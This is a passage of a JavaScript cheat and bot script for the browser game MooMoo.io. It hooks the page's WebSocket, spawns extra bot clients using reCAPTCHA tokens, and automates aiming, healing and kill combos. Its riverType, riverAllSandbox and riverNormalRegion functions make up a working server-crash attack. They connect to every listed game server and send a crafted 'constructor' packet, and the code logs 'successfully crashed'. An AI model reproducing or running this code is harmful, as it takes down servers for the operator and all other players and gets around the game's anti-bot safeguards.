                        doNewSend(["13c", [1, 6, 0]]);
                        doNewSend(["13c", [0, 6, 0]]);
                    }
                    if (empToggle) {
                        doNewSend(["13c", [1, 22, 0]]);
                        doNewSend(["13c", [0, 22, 0]]);
                    }
                    doNewSend(['c', [0]]);
                }, 300);
            }, 30);
        }
    }
    if (pointer) {
        pointingOnPosition = {x: myPlayer.x, y: myPlayer.y};
    }
    if (item == "17") {
        fnv = data[1];
        if (data[2]) {
            weapons = data[1];
            if (primary !== data[1][0]) {
                fnc.push(data[1][0]);
                primary = data[1][0];
            }
            if (secondary !== data[1][1]) {
                if (data[1][1]) {
                    fnc.push(data[1][1]);
                    secondary = data[1][1] || null;
                }
            }
        } else {
            mats = data[1];
            for (let i = 0; i < data[1].length; i++) {
                for (let i2 = 0; i2 < 3; i2++) {
                    if (i2 == data[1][i]) {
                        if (foodType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            foodType = data[1][i];
                        }
                    }
                }
                for (let i2 = 3; i2 < 6; i2++) {
                    if (i2 == data[1][i]) {
                        if (wallType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            wallType = data[1][i];
                        }
                    }
                }
                for (let i2 = 6; i2 < 10; i2++) {
                    if (i2 == data[1][i]) {
                        if (spikeType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            spikeType = data[1][i];
                        }
                    }
                }
                for (let i2 = 10; i2 < 13; i2++) {
                    if (i2 == data[1][i]) {
                        if (millType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            millType = data[1][i];
                        }
                    }
                }
                for (let i2 = 13; i2 < 15; i2++) {
                    if (i2 == data[1][i]) {
                        if (mineType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            mineType = data[1][i];
                        }
                    }
                }
                for (let i2 = 15; i2 < 17; i2++) {
                    if (i2 == data[1][i]) {
                        if (boostType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            boostType = data[1][i];
                        }
                    }
                }
                for (let i2 = 17; i2 < 23; i2++) {
                    if (i2 == data[1][i] && i2 !== 20) {
                        if (turretType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            turretType = data[1][i];
                        }
                    }
                    if (i2 == data[1][i] && i2 == 20) {
                        if (spawnpadType !== data[1][i]) {
                            fnc.push(data[1][i] + 16);
                            spawnpadType = data[1][i];
                        }
                    }
                }
            }
            for (let i2 in sockets) {
                for (let i = 0; i < fnc.length; i++) {
                    sockets[i2].oldSend(new Uint8Array(Array.from(msgpack5.encode(['6', [fnc[i]]]))));
                }
            }
        }
    }
    if (item == "ch") {
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!crash' && data[1] == myPlayer.id) {
            crashing = true;
        }
        if (data[2].toLocaleLowerCase() == '!ff' && data[1] == myPlayer.id) {
            playerFollowerGlobal = true;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
        if (data[2].toLocaleLowerCase() == '!!ff' && data[1] == myPlayer.id) {
            playerFollowerGlobal = false;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
        if (data[2].toLocaleLowerCase() == '!ffs' && data[1] == myPlayer.id) {
            ffs = true;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
            if(e.keyCode == 17 && document.activeElement.id.toLowerCase() !== 'chatbox') {
            ffs = true;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
            }
    if(e.keyCode == 226 && document.activeElement.id.toLowerCase() !== 'chatbox') {
            ffs = false;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
        if (data[2].toLocaleLowerCase() == '!!ffs' && data[1] == myPlayer.id) {
            ffs = false;
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!wood' && data[1] == myPlayer.id) {
            for (let i2 in sockets) {
                sockets[i2].wooding = true;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
            }
        }
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!stone' && data[1] == myPlayer.id) {
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = true;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
            }
        }
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!food' && data[1] == myPlayer.id) {
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = true;
                sockets[i2].mining = false;
            }
        }
        if ((data[2].toLocaleLowerCase()).split(' ')[0] == '!gold' && data[1] == myPlayer.id) {
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = true;
            }
        }
        if (data[2].toLocaleLowerCase() == '!f' && data[1] == myPlayer.id) {
            for (let i2 in sockets) {
                sockets[i2].wooding = false;
                sockets[i2].stoning = false;
                sockets[i2].fooding = false;
                sockets[i2].mining = false;
                sockets[i2].oldSend(new Uint8Array([146, 161, 99, 145, 0]));
            }
        }
        if ((data[2].toLocaleLowerCase()).split(" ")[0] == '!send' && data[1] == myPlayer.id) {
            if (data[2].split(" ")[1]) {
                if (eval(data[2].split(" ")[1]) >= 4) {
                    for (let i2 = 0; i2 < 4; i2++) {
                        grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                            wsType(`${myPlayer.server}&token=${encodeURIComponent(e)}`);
                        }));
                    }
                } else {
                    for (let i2 = 0; i2 < eval(data[2].split(" ")[1]); i2++) {
                        grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                            wsType(`${myPlayer.server}&token=${encodeURIComponent(e)}`);
                        }));
                    }
                }
            } else {
                for (let i2 = 0; i2 < 1; i2++) {
                    grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                        wsType(`${myPlayer.server}&token=${encodeURIComponent(e)}`);
                    }));
                }
            }
        }
    }
    if(data[0] == "h" && data[1] == myPlayer.id) {
        if (healToggle) {
            if(data[2] < 99 && data[2] > 0) {
                let placeNormal = (e, t = dir) => {
                    doNewSend(['5', [e, null]]);
                    doNewSend(['c', [1, t]]);
                    doNewSend(['c', [0, t]]);
                    doNewSend(['5', [null]]);
                }
                setTimeout( () => {
                    for (let i = 0; i < 2; i++) {
                        placeNormal(foodType, null);
                    }
                }, 80);

            }
        }
    }
    if (data[0] == "7") {
        for (let i in enemiesNear) {
            if (Math.sqrt(Math.pow((myPlayer.y-enemiesNear[i][2]), 2) + Math.pow((myPlayer.x-enemiesNear[i][1]), 2)) < 245) {
                if (data[3] == 5) {
                    let placeNormal = (e, t = dir) => {
                        doNewSend(['5', [e, null]]);
                        doNewSend(['c', [1, t]]);
                        doNewSend(['c', [0, t]]);
                        doNewSend(['5', [null]]);
                    }
                    placeNormal(foodType, null);
                    placeNormal(foodType, null);
                    placeNormal(foodType, null);
                    setTimeout(() => {
                        placeNormal(foodType, null);
                    }, 100)
                }
            }
        }
    }
}
setInterval(() => {
    if (bullTicker) {

    }
})
function riverAllSandbox() {
    fetch("http://sandbox.moomoo.io/serverData.js").then(e => e.text()).then(e => {
        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
        for (let gameServer of vultr.servers) {
            let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
            let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
            grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                riverType(`${serverhost}&token=${encodeURIComponent(e)}`, `${gameServer.region.split(":")[1]}:${gameServer.index}:0`);
            }));
        }
    })
}
function riverNormalRegion(regionId = "9") {
    fetch("http://moomoo.io/serverData.js").then(e => e.text()).then(e => {
        let vultr = JSON.parse(e.split("=")[1].split(";")[0]);
        let region = regionId;
        for (let gameServer of vultr.servers) {
            if (gameServer.region.split(":")[1] == region) {
                let serverhost = `wss://ip_${gameServer.ip}.moomoo.io:8008/?gameIndex=0`;
                let serverId = `${gameServer.region.split(":")[1]}:${gameServer.index}:0`;
                grecaptcha.execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", { action: "homepage" }).then((function(e) {
                    riverType(`${serverhost}&token=${encodeURIComponent(e)}`, `${gameServer.region.split(":")[1]}:${gameServer.index}:0`);
                }));
            }
        }
    })
}
function riverType(e, logForCrashedServer) {
    let ws = new WebSocket(e);
    ws.msgs = 0;
    ws.onopen = () => {
        ws.send(new Uint8Array([146, 162, 115, 112, 145, 131, 164, 110, 97, 109, 101, 161, 114, 167, 109, 111, 111, 102, 111, 108, 108, 161, 49, 164, 115, 107, 105, 110, 4]));
        ws.onmessage = () => {
            ws.msgs++;
            if (ws.msgs == 20) {
                console.log(`successfully crashed ${logForCrashedServer}`);
                ws.send(new Uint8Array([146, 161, 53, 146, 171, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 195]));
                ws.close();
            }
        }
    }
}
WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(m) {
    if (!ws) {
        ws = this;
        document.ws = this;
        this.addEventListener('message', e => { handleMessage(e); });
        this.addEventListener('close', () => { closed = true; });
    }
    if (!closed) {
        if (msgpack5.decode(m)[0] !== "2" && msgpack5.decode(m)[0] !== "c" && msgpack5.decode(m)[0] !== "33" && msgpack5.decode(m)[0] !== "ch" && msgpack5.decode(m)[0] !== "6" && msgpack5.decode(m)[0] !== "5" && msgpack5.decode(m)[0] !== "13c" && msgpack5.decode(m)[0] !== "7" && msgpack5.decode(m)[0] !== "8" && msgpack5.decode(m)[0] !== "9" && msgpack5.decode(m)[0] !== "10") {
            this.oldSend(m);
        }
        if (msgpack5.decode(m)[0] == "6") {
            sendForAll(msgpack5.decode(m));
            for (let i2 in sockets) {
                for (let i = 0; i < fnc.length; i++) {
                    sockets[i2].oldSend(new Uint8Array(Array.from(msgpack5.encode(['6', [fnc[i]]]))));
                }
            }
        }
        if (msgpack5.decode(m)[0] == "ch") {
            let data = msgpack5.decode(m);
            console.log(data);
            if (data[1][0].toLowerCase() == "!riversandbox") {
                riverAllSandbox();
            }
            if (data[1][0].toLowerCase().startsWith("!riverregion")) {
                let args = data[1][0].split(" ");
                riverNormalRegion(args[1]);
            }
            if (data[1][0].toLowerCase() == "river") {
                doNewSend(["5", ["constructor", true]])
            }
        }
        if (msgpack5.decode(m)[0] == "5") {
            this.oldSend(m);
            if (msgpack5.decode(m)[1][1]) {
                for (let i = 0; i < weapons.length; i++) {
                    if (weapons[i] == msgpack5.decode(m)[1][0]) {
                        for (let i2 in sockets) {
                            if (sockets[i2].controlled) {
                                if (!sockets[i2].wooding && !sockets[i2].stoning && !sockets[i2].fooding && !sockets[i2].mining) {
                                    sockets[i2].oldSend(new Uint8Array(Array.from(msgpack5.encode(["5", [sockets[i2].weapons[i], true]]))));
                                }
                            }
                        }
                    }
                }
            } else {
                for (let i = 0; i < mats.length; i++) {
                    if (mats[i] == msgpack5.decode(m)[1][0]) {
                        for (let i2 in sockets) {
                            if (sockets[i2].controlled) {
                                if (!sockets[i2].wooding && !sockets[i2].stoning && !sockets[i2].fooding && !sockets[i2].mining) {
                                    sockets[i2].oldSend(new Uint8Array(Array.from(msgpack5.encode(["5", [sockets[i2].mats[i], null]]))));
                                }
                            }
                        }
                    }
                }
            }
        }
        if (msgpack5.decode(m)[0] == "7") {
            if (msgpack5.decode(m)[1][0] == 1) {
                autoAttack = !autoAttack;
            }
            if (msgpack5.decode(m)[1][0] == 0) {
                freeze = !freeze;
            }
            this.oldSend(m);
            for (let i in sockets) {
                if (sockets[i].controlled) {
                    sockets[i].oldSend(m);
                }
            }
        }
        if (msgpack5.decode(m)[0] == "ch") {
            this.oldSend(m);
            if (!msgpack5.decode(m)[1][0].startsWith("!") && !msgpack5.decode(m)[1][0].startsWith("~")) {
                for (let i in sockets) {
                    sockets[i].oldSend(m);
                }
            }
        }
        if (msgpack5.decode(m)[0] == "13c") {
            sendForAll(msgpack5.decode(m));
        }
        if (msgpack5.decode(m)[0] == "8") {
            if (!msgpack5.decode(m)[1][0]) {
                doNewSend(["8", [createRandomClan()]]);
            } else {
                doNewSend(["8", [document.getElementById("allianceInput").value]]);
            }
        }
        if (msgpack5.decode(m)[0] == "9") {
            sendForAll(msgpack5.decode(m));
        }
        if (msgpack5.decode(m)[0] == "10") {
            sendForAll(msgpack5.decode(m));
        }
        if (msgpack5.decode(m)[0] == "33") {
            this.oldSend(m);
            typeMovement = msgpack5.decode(m)[1][0];
            if (pointer && !ffs) {
                for (let i in sockets) {
                    if (sockets[i].controlled) {
                        if (!sockets[i].wooding && !sockets[i].stoning && !sockets[i].fooding && !sockets[i].mining) {
                            if ((!sockets[i].playerFollower && !playerFollowerGlobal) || sockets[i].typeMovement) {
                                sockets[i].oldSend(m);
                            }
                        }
                    }
                }
            }
        }
    }
}
let sendForAll = (e) => {
    doNewSend(e);
    for (let i in sockets) {
        if (sockets[i].controlled) {
            if (!sockets[i].wooding && !sockets[i].stoning && !sockets[i].fooding && !sockets[i].mining) {
                sockets[i].oldSend(new Uint8Array(Array.from(msgpack5.encode(e))));
            }
        }
    }
};

let id = 0;

function wsType(e) {
    let ws = new WebSocket(e);
    ws.playerFollower = false;
    ws.typeMovement = null;
    ws.autoAttackWithAim3;
    ws.socketId = id++;
    ws.trees = [];
    ws.foods = [];
    ws.stones = [];
    ws.mines = [];
    ws.woodAmt = Infinity;
    ws.stoneAmt = Infinity;
    ws.goldAmt = Infinity;
    ws.foodAmt = Infinity;
    ws.controlled = true;
    let bot = {};
    ws.binaryType = "arraybuffer";
    let doNewSend = (e) => {
        if (!ws.closed) {
            ws.oldSend(new Uint8Array(Array.from(msgpack5.encode(e))));
        }
    }
    ws.poisonq = false;
    function poison() {
        if (!ws.poisonq) {
            ws.poisonq = true;
            doNewSend(["13c", [1, 21, 0]])
            doNewSend(['33', [ws.nearestEnemyAngle]])
            setTimeout(() => {
                doNewSend(['33', []])
                doNewSend(['13c', [0, 11, 1]])
                ws.poisonq = false;
            }, 300)
            ws.autoaim = true;
            ws.autoAttackWithAim3 = true;
            doNewSend(["5", [primary, 1]]);
            doNewSend(["13c", [0, 0, 1]])
            doNewSend(["13c", [0, 19, 1]])
            doNewSend(["13c", [0, 21, 0]])
            doNewSend(["2", [ws.nearestEnemyAngle]]);
            setTimeout(() => {
                ws.autoaim = false;
                ws.autoAttackWithAim3 = false;
                if (!empToggle) {
                    doNewSend(["13c", [1, 6, 0]]);
                    doNewSend(["13c", [0, 6, 0]]);
                }
                if (empToggle) {
                    doNewSend(["13c", [1, 22, 0]]);
                    doNewSend(["13c", [0, 22, 0]]);
                }
                doNewSend(['c', [0]]);
            }, 300);
        }
    }
    let msgFnc = (e) => {
        let temp = msgpack5.decode(new Uint8Array(e.data));
        let data = null;
        if(temp.length > 1) {
            data = [temp[0], ...temp[1]];
            if (data[1] instanceof Array){
                data = data;
            }
        } else {
            data = temp;
        }
        let item = data[0];
        if(!data) {return};
        if (item == "io-init") {
            let place = (e, t = dir) => {
                doNewSend(['5', [e, null]]);
                doNewSend(['c', [1, (Math.PI*9999999998) + t]]);
                doNewSend(['c', [0, (Math.PI*9999999998) + t]]);
                doNewSend(['5', [null]]);
            }
            let placeNormal = (e, t = dir) => {
                doNewSend(['5', [e, null]]);
                doNewSend(['c', [1, t]]);
                doNewSend(['c', [0, t]]);
                doNewSend(['5', [null]]);
            }
            ws.key23 = null;
            document.addEventListener('keydown', e => {
                if (!ws.closed && ws.controlled && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
                    if (ws.key23 !== e.keyCode) {
                        ws.key23 = e.keyCode;
                        if (document.activeElement.tagName.toLowerCase() !== "input" && document.activeElement.tagName.toLowerCase() !== "textarea" && !document.getElementById('chatHolder').offsetParent) {
                            if (e.keyCode == 85 || e.keyCode == 32) {
                                let myBotOldHat = bot.hat;
                                ws.autoaim = true;
                                doNewSend(["13c", [1, 6, 0]]);
                                doNewSend(["13c", [1, 7, 0]]);
                                doNewSend(["13c", [1, 53, 0]]);
                                doNewSend(["13c", [1, 21, 0]]);
                                ws.autoAttackWithAim3 = true;
                                doNewSend(['c', [1]])
                                doNewSend(["6", [5]]);
                                doNewSend(["6", [17]]);
                                doNewSend(["6", [31]]);
                                doNewSend(["6", [23]]);
                                doNewSend(["6", [9]]);
                                doNewSend(["6", [18]]);
                                doNewSend(['5', [9, true]]);
                                doNewSend(["13c", [0, 53, 0]]);
                                setTimeout(() => {
                                    if (ws.primary !== 8) {
                                        doNewSend(['6', [12]]);
                                    }
                                }, 145);
                                setTimeout(() => {
                                    if (ws.primary !== 8) {
                                        doNewSend(['6', [15]]);
                                    }
                                    doNewSend(['5', [15, true]]);
                                    doNewSend(['5', [ws.secondary, true]]);
                                    setTimeout(() => {
                                        ws.autoaim = false;
                                        ws.autoAttackWithAim3 = false;
                                        doNewSend(['5', [ws.primary, true]])
                                        doNewSend(['c', [0]])
                                        doNewSend(["2", [dir]]);
                                        if (!empToggle) {
                                            doNewSend(["13c", [1, 6, 0]]);
                                            doNewSend(["13c", [0, myBotOldHat, 0]]);
                                        }
                                        if (empToggle) {
                                            doNewSend(["13c", [1, 22, 0]]);
                                            doNewSend(["13c", [0, 22, 0]]);
                                        }
                                    }, 300);
                                }, 200);
                            }
                            if (e.keyCode == 186) {
                                for (let i=0;i<4;i++) {
                                    let angle = toRad(i * 90);
                                    place(spikeType, angle);
                                }
                            }
                            if (e.keyCode == 17) {
                                aimOnMouse = !aimOnMouse;
                            }
                            if (e.keyCode == 77) {
                                if (bot.y < 2400) {
                                    doNewSend(["13c", [1, 15, 0]]);
                                    doNewSend(["13c", [0, 15, 0]]);
                                } else if (bot.y > 6850 && bot.y < 7550) {
                                    doNewSend(["13c", [1, 31, 0]]);
                                    doNewSend(["13c", [0, 31, 0]]);
                                } else {
                                    doNewSend(["13c", [1, 12, 0]]);
                                    doNewSend(["13c", [0, 12, 0]]);
                                }
                                doNewSend(["13c", [1, 11, 1]]);
                                doNewSend(["13c", [0, 11, 1]]);
                            }
                            if (e.keyCode == 79) {
                                doNewSend(["6", [5]]);
                                doNewSend(["6", [17]]);
                                doNewSend(["6", [31]]);
                                doNewSend(["6", [23]]);
                                doNewSend(["6", [10]]);
                                doNewSend(["6", [18]]);
                                if (ws.primary !== 8) {
                                    doNewSend(["6", [36]]);
                                }
                            }
                            if (e.keyCode == 82) {
                                doNewSend(["13c", [1, 6, 0]]);
                                doNewSend(["13c", [1, 7, 0]]);
                                doNewSend(["13c", [1, 53, 0]]);
                                ws.autoInsta = true;
                            }
                            if (e.keyCode == 72) {
                                ws.autoInsta = false;
                            }
                        }
                    }
                }
            })
            document.addEventListener('keyup', e => {
                if (!ws.closed && ws.controlled && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
                    ws.key23 = null;
                }
                if (e.keyCode == 81) {
                    doNewSend(['c', [0]]);
                    doNewSend(['5', [null]]);
                }
            })
            cvs.addEventListener('mousemove', e => {
                if (ws.controlled && !ws.closed && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
                    if (!autoaim && !ffs && !aimOnMouse) {
                        doNewSend(['2', [dir]]);
                    }
                    if (aimOnMouse && !ffs) {
                        if (ffsps !== Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2))) {
                            ffsps = Math.atan2((myPlayer.y - bot.y) + mouseY - (height / 2), (myPlayer.x- bot.x) + mouseX - (width / 2));
                            if (!ws.autoaim) {
                                doNewSend(['2', [ffsps]]);
                            }
                        }
                    }
                }
            })
            cvs.addEventListener('mousedown', e => {
                if (ws.controlled) {
                    if (e.button == 0) {
                        doNewSend(['c', [1]]);
                    }
                    if (e.button == 1) {
                        ws.autoaim = true;
                        doNewSend(['c', [1]]);
                    }
                    if (e.button == 2) {
                        poison();
                        doNewSend(['c', [1]]);
                    }
                }
            })
            cvs.addEventListener('mouseup', e => {
                if (ws.controlled) {
                    if (e.button == 0) {
                        doNewSend(['c', [0]]);
                    }
                    if (e.button == 1) {
                        ws.autoaim = false;
                        doNewSend(['c', [0]]);
                    }
                    if (e.button == 2) {
                        doNewSend(['c', [0]]);
                    }
                }
            })
            setInterval(() => {
                if (!ws.closed) {
                    if (ws.autoaim || ws.autoaim2) {
                        doNewSend(['2', [ws.nearestEnemyAngle]]);
                    }
                    if (healer) {
                        placeNormal(ws.foodType, null);
                    }
                    if (ws.controlled && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
                        if (spiker) {
                            place(ws.spikeType);
                        }
                    }
                    if (ws.autoAttackWithAim3) {
                        doNewSend(['c', [1]]);
                    }
                }
            }, 0);
            setInterval(() => {
                if (!ws.closed) {
                    if (ws.controlled && !ws.wooding && !ws.stoning && !ws.fooding && !ws.mining) {
                        if (miller) {
                            place(ws.millType, dir + toRad(33.5));
                            place(ws.millType, dir - toRad(33.5));
                        }
                        if (trapper) {
                            if (trapper4) {
                                for (let i = 0; i < 4; i++) {
                                    place(ws.boostType, dir + toRad(i * 90));
                                }
                            } else {
                                place(ws.boostType);
                            }
                        }
                    }
                }
            }, 100);
            ws.weapons = [0];
            ws.mats = [0, 3, 6, 10];
            ws.secondary = null;
            ws.primary = 0;
            ws.foodType = 0;
            ws.wallType = 3;
            ws.spikeType = 6;
            ws.millType = 10;
            ws.boostType = null;
            ws.mineType = null;
            ws.turretType = null;
            ws.spawnpadType = null;
            doNewSend(['sp', [{name: botsName(), moofoll: "1", skin: 4}]]);
        }
        if (item == "1" && !bot.id) {
            doNewSend(['13c', [0, 36, 0]]);
            bot.id = data[1];
            bot.wood = 100;
            bot.stone = 100;
            bot.food = 100;
            bot.points = 100;
            bot.kills = 0;
            bot.goldPerSecond = 0;
            bot.oldPoints = 0;
            bot.newPoints = 0;
            if (sockets) {
                sockets[data[1]] = ws;
            }
        }
        if (item == "id") {
            for (let i in data[1].teams) {
                if (data[1].teams[i].owner == myPlayer.id || data[1].teams[i].sid == myPlayer.clan) {
                    setTimeout(() => {
                        doNewSend(['10', [data[1].teams[i].sid]]);
                    }, 100);
                }
            }
        }
        if (item == "11") {
            ws.weapons = [0];
            ws.mats = [0, 3, 6, 10];
            ws.secondary = null;
            ws.primary = 0;
            ws.foodType = 0;
            ws.wallType = 3;
            ws.spikeType = 6;
            ws.millType = 10;
            ws.boostType = null;
            ws.mineType = null;
            ws.turretType = null;
            ws.spawnpadType = null;
            bot.wood = 100;
            bot.stone = 100;
            bot.food = 100;
            bot.points = 100;
            bot.kills = 0;
            bot.goldPerSecond = 0;
            bot.oldPoints = 0;
            bot.newPoints = 0;
            if (!autoAttack && !freeze) {
                doNewSend(['sp', [{name: botsName(), moofoll: "1", skin: 4}]]);
            } else {
                ws.JustDied = true;
            }
        }
        if (ws.JustDied) {
            if (!autoAttack && !freeze) {
                ws.JustDied = false;
                doNewSend(['sp', [{name: botsName(), moofoll: "1", skin: 4}]]);
            }
        }
        if (item == "2") {
            if (data[1][2] == myPlayer.id) {
                bot.x = data[1][3];
                bot.y = data[1][4];
                bot.dir = data[1][5];
                if (data[1][7] < 90 && data[1][7] > 0) {
                    if (healToggle) {
                        doNewSend(['5', [ws.foodType, null]]);
                        doNewSend(['c', [1]]);
                        doNewSend(['c', [0]]);
                        doNewSend(['5', [null]]);
                    }
                }
            }
        }
        if (item == "33") {
            ws.enemiesNear = [];
            for(let i = 0; i < data[1].length / 13; i++) {
                let playerInfo = data[1].slice(13*i, 13*i+13);
                if(playerInfo[0] == bot.id) {
                    bot.x = playerInfo[1];
                    bot.y = playerInfo[2];
                    bot.dir = playerInfo[3];
                    bot.weapon = playerInfo[5];
                    bot.clan = playerInfo[7];
                    bot.isLeader = playerInfo[8];
                    bot.hat = playerInfo[9];
                    bot.accessory = playerInfo[10];
                } else if(playerInfo[7] !== bot.clan || playerInfo[7] === null) {
                    delete playerInfo[4];
                    delete playerInfo[6];
                    delete playerInfo[11];
                    delete playerInfo[12];
                    delete playerInfo[13];
                    ws.enemiesNear.push(playerInfo);
                }
            }
        }
        if (item == "9") {
            if (data[1] == "wood") {
                bot.wood = data[2];
            }
            if (data[1] == "stone") {
                bot.stone = data[2];
            }
            if (data[1] == "food") {
                bot.food = data[2];
            }
            if (data[1] == "points") {
                bot.newPoints = data[2];
                bot.goldPerSecond = bot.newPoints - bot.oldPoints;
                bot.oldPoints = data[2];
                bot.points = data[2];
            }
            if (data[1] == "kills") {
                bot.kills = data[2];
            }
        }
        if (item == "6") {
            for(let i = 0; i < data[1].length / 8; i++) {
                let info = data[1].slice(8*i, 8*i+8);
                if (info[5] == 0) {
                    ws.trees.push(info);
                }
                if (info[5] == 1) {
                    ws.foods.push(info);
                }
                if (info[5] == 2) {
                    ws.stones.push(info);
                }
                if (info[5] == 3) {
                    ws.mines.push(info);
                }
            }
        }
        if (ws.trees) {
            ws.nearestTree = ws.trees.sort((a,b) => dist(a, bot) - dist(b, bot))[0];
            if (ws.nearestTree) {
                ws.nearestTreeAngle = Math.atan2(ws.nearestTree[2]-bot.y, ws.nearestTree[1]-bot.x);
            }
        }
        if (ws.foods) {
            ws.nearestFood = ws.foods.sort((a,b) => dist(a, bot) - dist(b, bot))[0];
            if (ws.nearestFood) {
                ws.nearestFoodAngle = Math.atan2(ws.nearestFood[2]-bot.y, ws.nearestFood[1]-bot.x);
            }
        }
        if (ws.stones) {
            ws.nearestStone = ws.stones.sort((a,b) => dist(a, bot) - dist(b, bot))[0];
            if (ws.nearestStone) {
                ws.nearestStoneAngle = Math.atan2(ws.nearestStone[2]-bot.y, ws.nearestStone[1]-bot.x);
            }
        }
        if (ws.mines) {
            ws.nearestMine = ws.mines.sort((a,b) => dist(a, bot) - dist(b, bot))[0];
            if (ws.nearestMine) {
                ws.nearestMineAngle = Math.atan2(ws.nearestMine[2]-bot.y, ws.nearestMine[1]-bot.x);
            }
        }
        ws.isEnemyNear = false;
        if(ws.enemiesNear) {
            ws.nearestEnemy = ws.enemiesNear.sort((a,b) => dist(a, bot) - dist(b, bot))[0];
        }
        if(ws.nearestEnemy) {
            ws.nearestEnemyAngle = Math.atan2(ws.nearestEnemy[2]-bot.y, ws.nearestEnemy[1]-bot.x);
            if(Math.sqrt(Math.pow((bot.y-ws.nearestEnemy[2]), 2) + Math.pow((bot.x-ws.nearestEnemy[1]), 2)) < 300) {
                ws.isEnemyNear = true;
                if(!ws.autoaim && bot.hat != 7 && bot.hat != 53) {
                    ws.normalHat = 6;
                    if(ws.primary != 8) {
                        ws.normalAcc = 19;
                    }
                };
            }
        }
        if(!ws.isEnemyNear && !ws.autoaim) {
            ws.normalAcc = 11;
            if (bot.y < 2400){
                ws.normalHat = 15;
            } else if (bot.y > 6850 && bot.y < 7550){
                ws.normalHat = 31;
            } else {
                ws.normalHat = 12;
            }
        }
        if(hatToggle) {
            if(ws.oldHat != ws.normalHat) {
                ws.oldHat = ws.normalHat;
                doNewSend(['13c', [1, ws.normalHat, 0]]);
                doNewSend(['13c', [0, ws.normalHat, 0]]);
            }
            if(ws.oldAcc != ws.normalAcc) {
                ws.oldAcc = ws.normalAcc;
                doNewSend(['13c', [1, ws.normalAcc, 1]]);
                doNewSend(['13c', [0, 0, 1]]);
                doNewSend(['13c', [0, ws.normalAcc, 1]]);
            }
        }
        if (ws.nearestEnemy && ws.autoInsta) {
            if (Math.sqrt(Math.pow((bot.y-ws.nearestEnemy[2]), 2) + Math.pow((bot.x-ws.nearestEnemy[1]), 2)) < 215) {
                ws.autoInsta = false;
                ws.autoaim = true;
                ws.autoAttackWithAim3 = true;
                doNewSend(['33', [ws.nearestEnemyAngle]]);
                let myBotOldHat = bot.hat;
                setTimeout(() => {
                    doNewSend(['33', []]);
                    doNewSend(['13c', [0, 11, 1]]);
                    doNewSend(['13c', [1, 21, 1]]);
                    doNewSend(['13c', [0, 21, 1]]);
                }, 300)
                if (bot.weapon == 0) {
                    doNewSend(["6", [5]]);
                    doNewSend(["6", [17]]);
                    doNewSend(["6", [31]]);
                    doNewSend(["6", [23]]);
                    doNewSend(["6", [10]]);
                    doNewSend(["6", [18]]);
                    doNewSend(["6", [36]]);
                }
                doNewSend(["6", [15]]);
                doNewSend(['13c', [0, 0, 1]])
                doNewSend(['13c', [0, 19, 1]])
                doNewSend(['13c', [0, 7, 0]])
                doNewSend(["5", [ws.primary, 1]]);
                doNewSend(['c', [1, ws.nearestEnemyAngle]]);
                setTimeout(() => {
                    doNewSend(['13c', [0, 53, 0]]);
